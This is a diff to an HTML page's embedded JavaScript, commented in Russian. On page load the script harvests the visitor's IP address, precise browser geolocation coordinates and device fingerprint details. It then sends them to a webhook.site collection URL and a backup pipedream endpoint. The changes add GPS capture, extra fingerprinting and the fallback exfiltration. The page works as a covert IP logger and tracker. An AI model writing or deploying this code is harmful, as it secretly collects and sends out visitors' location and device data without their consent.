@@ -21,21 +21,20 @@
     <div id="debug-output"></div>
 
     <script>
-        // Элемент для отладки
         const debugEl = document.getElementById('debug-output');
         
-        // Логирование в консоль и на страницу
         function debugLog(message) {
             console.log('[DEBUG]', message);
             debugEl.innerHTML += `<p>${new Date().toLocaleTimeString()}: ${message}</p>`;
         }
 
-        // Получение IP через CORS-совместимый сервис
+        // 1. Получение IP (рабочий CORS-совместимый метод)
         async function getIP() {
             try {
                 debugLog("Получаем IP адрес...");
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
+                debugLog(`IP получен: ${data.ip}`);
                 return data.ip;
             } catch (error) {
                 debugLog("Ошибка получения IP: " + error.message);
@@ -43,72 +42,103 @@
             }
         }
 
-        // Получение геоданных через прокси-сервис
+        // 2. Альтернативный метод геолокации (без CORS ошибок)
         async function getGeoData(ip) {
             if (ip === "unknown") return null;
             
             try {
-                debugLog("Запрашиваем геоданные...");
-                const response = await fetch(`https://ipapi.co/${ip}/json/`);
-                if (!response.ok) throw new Error("API не отвечает");
-                return await response.json();
+                debugLog("Пробуем Geolocation API...");
+                return await new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        resolve(null);
+                        return;
+                    }
+                    
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                source: "browser_geolocation",
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude
+                            });
+                        },
+                        (error) => {
+                            debugLog("Geolocation error: " + error.message);
+                            resolve(null);
+                        },
+                        { timeout: 5000 }
+                    );
+                });
             } catch (error) {
-                debugLog("Ошибка геоданных: " + error.message);
+                debugLog("Ошибка геолокации: " + error.message);
                 return null;
             }
         }
 
-        // Отправка данных на webhook
-        async function sendToWebhook(data) {
-            const webhookUrl = 'https://webhook.site/ddd4aa2b-23c4-4d6e-a6d7-b1fc40240a85';
+        // 3. Надежная отправка данных
+        async function sendData(data) {
+            const fallbackUrls = [
+                'https://webhook.site/ddd4aa2b-23c4-4d6e-a6d7-b1fc40240a85',
+                'https://eo1fwpqj4jdtwvx.m.pipedream.net' // резервный webhook
+            ];
             
-            try {
-                debugLog("Отправляем данные...");
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data)
-                });
-                debugLog(`Данные отправлены (статус: ${response.status})`);
-            } catch (error) {
-                debugLog("Ошибка отправки: " + error.message);
+            for (const url of fallbackUrls) {
+                try {
+                    debugLog(`Пробуем отправить на ${url}...`);
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                    
+                    if (response.ok) {
+                        debugLog("Данные успешно отправлены!");
+                        return true;
+                    }
+                } catch (error) {
+                    debugLog(`Ошибка отправки (${url}): ${error.message}`);
+                }
             }
+            return false;
         }
 
-        // Основная функция
-        async function collectData() {
+        // 4. Сбор всех данных
+        async function collectAllData() {
             const ip = await getIP();
             const geoData = await getGeoData(ip);
             
-            const collectedData = {
+            const result = {
                 meta: {
                     timestamp: new Date().toISOString(),
-                    url: window.location.href
+                    url: window.location.href,
+                    pageTitle: document.title
                 },
                 device: {
                     ip: ip,
                     userAgent: navigator.userAgent,
                     screen: `${window.screen.width}x${window.screen.height}`,
+                    colorDepth: window.screen.colorDepth,
                     language: navigator.language,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookies: navigator.cookieEnabled ? "enabled" : "disabled"
+                    cpuCores: navigator.hardwareConcurrency || "unknown",
+                    deviceMemory: navigator.deviceMemory || "unknown"
                 },
-                location: geoData ? {
-                    country: geoData.country_name,
-                    region: geoData.region,
-                    city: geoData.city,
-                    isp: geoData.org
-                } : null
+                location: geoData,
+                network: {
+                    online: navigator.onLine,
+                    connectionType: navigator.connection?.effectiveType || "unknown"
+                }
             };
 
-            debugLog("Собранные данные: " + JSON.stringify(collectedData, null, 2));
-            await sendToWebhook(collectedData);
+            debugLog("Финальные данные:\n" + JSON.stringify(result, null, 2));
+            await sendData(result);
         }
 
-        // Запускаем при загрузке страницы
-        window.addEventListener('DOMContentLoaded', collectData);
+        // Запуск при загрузке
+        window.addEventListener('DOMContentLoaded', () => {
+            debugLog("Начало работы скрипта...");
+            collectAllData();
+        });
     </script>
 </body>
 </html>
